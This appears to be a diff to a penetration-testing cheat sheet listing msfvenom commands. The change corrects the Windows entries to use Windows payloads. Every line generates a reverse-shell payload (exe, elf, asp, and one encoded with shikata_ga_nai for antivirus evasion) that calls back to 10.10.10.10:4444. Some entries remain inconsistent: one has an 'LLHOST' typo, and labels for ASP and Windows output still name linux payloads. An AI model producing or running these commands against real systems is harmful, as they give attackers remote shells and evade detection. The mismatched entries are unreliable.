@@ -3,7 +3,7 @@ msfvenom -l payloads
 msfvenom -l formats
 
 # Create an staged Windows binary payload
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
 
 # Create an staged Linux binary payload
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o reverse_shell.elf
@@ -12,7 +12,7 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o r
 msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f asp -o reverse_shell.asp
 
 # Create a non staged Windows binary payload
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse_shell.exe
 
 # Create an staged Windows binary ENCODED payload
 msfvenom -p linux/x86/shell/reverse_tcp LLHOST=10.10.10.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o reverse_shell_encoded.exe
